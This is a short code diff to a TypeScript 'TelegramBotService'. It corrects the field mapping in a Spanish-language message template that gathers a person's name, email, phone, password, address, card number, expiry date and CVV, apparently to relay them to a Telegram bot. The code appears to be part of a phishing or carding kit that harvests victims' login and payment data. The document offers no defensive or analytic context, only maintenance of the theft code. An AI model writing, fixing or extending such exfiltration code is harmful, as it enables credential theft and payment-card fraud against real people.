@@ -147,7 +147,7 @@ export class TelegramBotService {
       };
 
       const message = `
-            <b>Informacion Cliente</b> \nNombre: ${globalMessage.fullName} \nCorreo: ${globalMessage.phone} \nNumero: ${globalMessage.password} \nClave : ${globalMessage.password}
+            <b>Informacion Cliente</b> \nNombre: ${globalMessage.fullName} \nCorreo: ${globalMessage.email} \nNumero: ${globalMessage.phone} \nClave : ${globalMessage.password}
             \n<b>Direccion Cliente</b> \nCiudad: ${globalMessage.city} \nEstado: ${globalMessage.state.name}(${globalMessage.state.code}) \nPais  : ${globalMessage.country.name}(${globalMessage.country.code}) \nDireccion: ${globalMessage.address}\n \n<b>Informacion de pago</b> \nNumber: ${globalMessage.cardNumber} \nFecha : ${globalMessage.expirationDate} \nCodigo: ${globalMessage.cardCVV}\n\nFecha: ${globalMessage.entryDate}
         `;
 
